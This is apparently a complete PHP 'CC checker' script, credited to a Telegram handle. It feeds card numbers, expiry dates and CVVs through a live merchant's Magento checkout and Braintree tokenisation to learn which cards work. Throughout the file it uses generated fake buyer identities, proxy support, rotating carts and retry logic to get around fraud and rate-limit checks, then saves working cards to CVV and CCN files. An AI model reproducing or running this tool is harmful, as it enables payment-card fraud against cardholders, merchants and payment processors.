<?php
# ---------- [ HASHIE ] ---------- #
# [ https://t.me/hashshinrinyoku ] #

error_reporting(1);
$time_start = microtime(true);

# ---------- [ FUNCTION ] ---------- #

function gStr($ichi, $ni = '', $san = '') {
    if (strpos($ichi, $ni)) {
        $yon = strpos($ichi, $ni) + strlen($ni);
        $go = substr($ichi, $yon, strlen($ichi));
        $roku = strpos($go, $san);
        if ($roku == 0) {
            $roku = strlen($go);
        }
        return substr($go, 0, $roku);
    } else {
        return '';
    }
}
function genRandom($length) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function checkForErrors($response, $errorMessages) {
    foreach ($errorMessages as $errorMessage) {
        if (strpos($response, $errorMessage) !== false) {
            return true;
        }
    }
    return false;
}
function write($key, $what) {
    fwrite(fopen($key.'.txt', 'a'), $what."\n");
}

# ---------- [ CC FUNCTION ] ---------- #

$list = $_GET['lista'];

$cc_in = preg_replace('/[^0-9|]+/', '|', $list);
$lista = trim($cc_in);
$lista = str_replace("-", "", $lista);
$lista = preg_replace('/\s+/', '|', $lista);
$raw = explode("|", $lista);
$cc = $raw[0];
$mes = $raw[1];
$mes = strlen($mes) == 1 ? '0'.$mes : $mes;
$ano = $raw[2];
$ano = strlen($ano) == 2 ? '20'.$ano : $ano;
$cvv = $raw[3];

$type = substr($cc, 0, 1);
if ($type == "5") {
    $type = "MC";
} else if ($type == "4") {
    $type = "VI";
}

$yy = substr($ano, -2);
$last_4 = substr($cc, -4);
$bin = substr($cc, 0, 6);




$filename = "cvv.txt";
if (!empty($cc)) {
    $needle = $cc;
    $lines = file($filename);
    foreach ($lines as $line) {
        if (strpos($line, $needle) !== false) {
            exit(''.$lista.' [#CCN] [Bruh this cc is already checked.]');
        }
    }
}

function isvalid($cc) {
    $cc = preg_replace('/\D/', '', $cc);
    $cc_length = strlen($cc);
    $parity = $cc_length % 2;
    $total = 0;
    for ($i = 0; $i < $cc_length; $i++) {
        $digit = $cc[$i];
        if ($i % 2 == $parity) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $total += $digit;
    }
    return ($total % 10 == 0) ? TRUE : FALSE;
}
$check = isvalid($cc);
if (!$check == 1) {
    exit(' [This CC failed the Luhn algorithm] [R:0 T:0]');
}

$retry = 0;
retry:
$cookie = tempnam ("/tmp", "CURLCOOKIE");
$formkey = genRandom(16);


# ---------- [ ADDRESS ] ---------- #

#Set the country base on shortname of the country. Example United States to US, Candada to CA, and United Kingdom to GB or UK, and so forth.

$random_address = file_get_contents("https://rakaka.dreamhosters.com?country=US");

$data = json_decode($random_address, true);
$street = $data['hello']['street']['name'];
$city = $data['hello']['street']['city'];
$zip = $data['hello']['street']['zip'];
$state = $data['hello']['street']['state'];
$full_state = $data['hello']['street']['state_full'];
$regionID = $data['hello']['street']['regionId'];
$country = $data['hello']['street']['country'];
$full_name = $data['hello']['person']['full_name'];
$name = $data['hello']['person']['first_name'];
$lname = $data['hello']['person']['last_name'];
$email = $data['hello']['person']['email'];
$phone = $data['hello']['person']['phone'];
$ua = $data['hello']['person']['ua'];


if (!$name) {
    $lname = "Konichiwa";
    $name = "Minasan";
    $street = "2807 West Magnolia";
    $city = "Burbank";
    $zip = "91505";
    $state = "CA";
    $full_state = "California";
    $regionID = "12";
    $email = "konichiwaminsan@gmail.com";
    $phone = "0416567460";
    $country = "US";
    $ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36";
}


# ---------- [ START ] ---------- #



#Proxy if you have

$proxy_port = '';
$user_pass = '';




#You can add as many ATC  as you like, just make sure they are all working.
#You can also add atc details from different sites to have less risk_threshold.
#And better to have multiple ATC details from one site cause sometime they have limited stock on their item.
#Note: Array start from 0
$data = array(
"https://www.vikingpowersports.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cudmlraW5ncG93ZXJzcG9ydHMuY29tL3lhbWFoYS03MGhwLTE5ODQtMjAwOS0yLXN0cm9rZS1vdXRib2FyZC1mdWVsLXB1bXAuaHRtbA%2C%2C/product/976/" => "product=976&selected_configurable_option=&related_product=&form_key=$formkey&qty=1",
);


#This code cycles the atc cart better than the random shuffle select
if (!file_exists("rand.txt")) {
    file_put_contents("rand.txt", "0");
}
$currentPosition = intval(file_get_contents("rand.txt"));
if ($currentPosition >= count($data)) {
    $currentPosition = 0;
}
$action = array_keys($data)[$currentPosition];
$postfield = $data[$action];
$currentPosition++;
file_put_contents("rand.txt", $currentPosition);


$selected = explode("/", $action);
$hostname = $selected[2];

$ch = curl_init($action);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'content-type: application/x-www-form-urlencoded',
    "cookie: form_key=$formkey;PHPSESSID=$formkey",
    'user-agent: '.$ua
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postfield);
curl_exec($ch);
curl_close($ch);


$ch = curl_init("https://$hostname/checkout/cart/");
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'user-agent: '.$ua
]);
$checkout = curl_exec($ch);
unlink($cookie);
$cart_id = gStr($checkout, '"quoteData":{"entity_id":"', '"');
curl_close($ch);

if (!$cart_id) {
    $cart_retry++;
    if ($cart_retry == 5) {
        $err = "Unable to Add to Cart";
        write('retry_cc', $list);
        goto end;
    }
    goto retry;
}

$clientToken = gStr($checkout, '"isActive":true,"clientToken":"', '"');
$clean_clientToken = base64_decode($clientToken);
$data = json_decode($clean_clientToken, true);
$bearer = $data['authorizationFingerprint'];
$merchantId = $data['merchantId'];



$ch = curl_init("https://$hostname/rest/V1/guest-carts/$cart_id/estimate-shipping-methods");
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'content-type: application/json',
    'user-agent: '.$ua
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"address":{"street":["'.$street.'"],"city":"'.$city.'","region_id":"'.$regionID.'","region":"'.$full_state.'","country_id":"'.$country.'","postcode":"'.$zip.'","firstname":"'.$name.'","lastname":"'.$lname.'","company":"'.$name.'","telephone":"'.$phone.'"}}');
$estimate_shipping_methods = curl_exec($ch);
$carrier_code = gStr($estimate_shipping_methods, '"carrier_code":"', '"');
$method_code = gStr($estimate_shipping_methods, '"method_code":"', '"');
curl_close($ch);



$ch = curl_init("https://$hostname/rest/V1/guest-carts/$cart_id/shipping-information");
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'content-type: application/json',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"'.$country.'","regionId":"'.$regionID.'","regionCode":"'.$state.'","region":"'.$full_state.'","street":["'.$street.'"],"company":"'.$name.'","telephone":"'.$phone.'","postcode":"'.$zip.'","city":"'.$city.'","firstname":"'.$name.'","lastname":"'.$lname.'"},"billing_address":{"countryId":"'.$country.'","regionId":"'.$regionID.'","regionCode":"'.$state.'","region":"'.$full_state.'","street":["'.$street.'"],"company":"'.$name.'","telephone":"'.$phone.'","postcode":"'.$zip.'","city":"'.$city.'","firstname":"'.$name.'","lastname":"'.$lname.'","saveInAddressBook":null},"shipping_method_code":"'.$method_code.'","shipping_carrier_code":"'.$carrier_code.'","extension_attributes":{}}}');
$ship = curl_exec($ch);
$total = gStr($ship, '"base_grand_total":', ',');
if (!$total) {
    $total = gStr($ship, '"base_grand_total":"', '",');
}
curl_close($ch);

$ch = curl_init("https://payments.braintree-api.com/graphql");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'content-type: application/json',
    "Authorization: Bearer $bearer",
    'Braintree-Version: 2018-05-10',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.genRandom(32).'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$braintree = curl_exec($ch);
$graphql = json_decode($braintree, 1)["data"]["tokenizeCreditCard"]["token"];
curl_close($ch);


if (strpos($clean_clientToken, '"threeDSecureEnabled":true')) {
    $ch = curl_init("https://api.braintreegateway.com/merchants/$merchantId/client_api/v1/payment_methods/$graphql/three_d_secure/lookup");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Braintree-Version: 2018-05-10',
        'Content-Type: application/json',
        'user-agent: '.$ua,
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"'.$total.'","additionalInfo":{"billingLine1":"2807 West Magnolia","billingCity":"Burbank","billingState":"CA","billingPostalCode":"91505","billingCountryCode":"US","billingPhoneNumber":"+11415724148","billingGivenName":"Go","billingSurname":"Sen"},"challengeRequested":true,"dfReferenceId":"0_112559d2-44c3-456b-b786-a01f39d630d3","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.79.1","cardinalDeviceDataCollectionTimeElapsed":658},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.79.1","_meta":{"merchantAppId":"'.$hostname.'","platform":"web","sdkVersion":"3.79.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"0a99d66b-4214-4e2a-a73d-551021cb7330"}}');
    $lookup = curl_exec($ch);
    $nonce = gStr($lookup, '"nonce":"', '"');
    curl_close($ch);
    if (!empty($nonce)) {
        $graphql = $nonce;
    }
}


$ch = curl_init("https://$hostname/rest/V1/guest-carts/$cart_id/billing-validate-address");
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'content-type: application/json',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"address":{"street":["'.$street.'"],"city":"'.$city.'","region_id":null,"region":"","country_id":"'.$country.'","postcode":"'.$zip.'","firstname":"'.$name.'","lastname":"'.$lname.'","company":"'.$name.'","telephone":"'.$phone.'"}}');
$validate = curl_exec($ch);
curl_close($ch);


$ch = curl_init("https://$hostname/rest/V1/guest-carts/$cart_id/payment-information");
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'content-type: application/json',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"'.$cart_id.'","billingAddress":{"countryId":"'.$country.'","regionId":"'.$regionID.'","regionCode":"'.$state.'","region":"'.$full_state.'","street":["'.$street.'"],"telephone":"'.$phone.'","postcode":"'.$zip.'","city":"'.$city.'","firstname":"'.$name.'","lastname":"'.$lname.'","saveInAddressBook":0},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$graphql.'","device_data":"{\"device_session_id\":\"'.genRandom(32).'\",\"fraud_merchant_id\":\"null}","is_active_payment_token_enabler":true},"extension_attributes":{"agreement_ids":["1","2"]}},"email":"'.$email.'"}');
$response = curl_exec($ch);
if (!$response) {
    $retry++;
    if ($retry == 5) {
        $err = 'Empty Response';
        write('retry_cc', $list);
        goto end;
    }
    goto retry;
}

$htcode = curl_getinfo($ch)["http_code"];
if (strpos($response, 'message')) {
    $err = json_decode($response, 1)["message"];
}
if (!$err) {
    $err = $response;
}


#Add word or sentence you want to remove
$replace_m = [
    "Your payment could not be taken. Please try again or use a different payment method.",
    " on the card",
    " and 3 digits for other card types.",
    "instrument type ",
];


foreach ($replace_m as $m) {
    $err = str_replace($m, "", $err);
}

if ($err == 'payment_method_nonce does not contain a valid payment instrument type.') {
    $err = 'Credit card type is not accepted by this merchant account.';
}

$id = $response;
curl_close($ch);


# ----------- [ RETRIES ] ----------- #


#Add word on response you want to retry or recheck
$retryMessages = [
    'risk_threshold',
    'Rejected: fraud',
    'Please specify a shipping method',
    ' and try again.',
    'Invalid email format',
    '502 Bad Gateway',
    'Verify and try again',
    'error has happened',
    'error occurred on the server',
    'to save address',
    'Forbidden',
    'CloudFront',
    'Request limit exceeded',
    'shipping address information',
];

#It will retry or recheck up to 5x
while (checkForErrors($response, $retryMessages)) {
    $retry++;
    if ($retry == 5) {
        write('retry_cc', $list);
        goto end;
    }
    goto retry;
}


#Add word that is totally bad error you want cc save on retry_cc to check later again
$badResponse = [
    'ReCaptcha validation',
    'Captcha',
];
while (checkForErrors($response, $badResponse)) {
    echo "$response Replace Atc: ". $currentPosition - 1;
    write('retry_cc', $list);
    exit;
}



# ----------- [ RESPONSES ] ----------- #

end:
$time_total = round(microtime(true) - $time_start);


if ((strpos($htcode, '200') !== false) || (strpos($response, '"success":true'))) {
    echo ' [#CVV]['.$id.'»'.$total.'] [R:'.$retry.' T:'.$time_total.']';
    write('cvv', $list."[CVV $id $total]");
} elseif ((strpos($response, 'avs_and_cvv')) || (strpos($response, 'Gateway Rejected: avs_and_cvv'))) {
    echo ' [#CCN] ['.ltrim($err).'] [R:'.$retry.' T:'.$time_total.']';
    write('ccn-avs', $list."[CCN - AVS_AND_CVV]");
} elseif (strpos($response, 'avs')) {
    echo ' [#CVV] ['.ltrim($err).'] [R:'.$retry.' T:'.$time_total.']';
    write('cvv', $list."[CVV - AVS]");
} elseif (strpos($response, 'Address Validation')) {
    echo ' [#CVV] ['.ltrim($err).'] [R:'.$retry.' T:'.$time_total.']';
    write('cvv', $list."[CVV - AVS]");
} elseif (strpos($response, 'Card Issuer Declined CVV')) {
    echo ' [#CCN] ['.ltrim($err).'] [R:'.$retry.' T:'.$time_total.']';
    write('ccn', $list."[CCN - NULL]");
} elseif ((strpos($response, 'Insufficient Funds')) || (strpos($response, 'Insufficient funds in account'))) {
    echo ' [#CCN] ['.ltrim($err).'] [R:'.$retry.' T:'.$time_total.']';
    write('insuff', $list."[INSUFFICIENT]");
} else {
    echo ' ['.ltrim($err).'] [R:'.$retry.' T:'.$time_total.']';
}
?>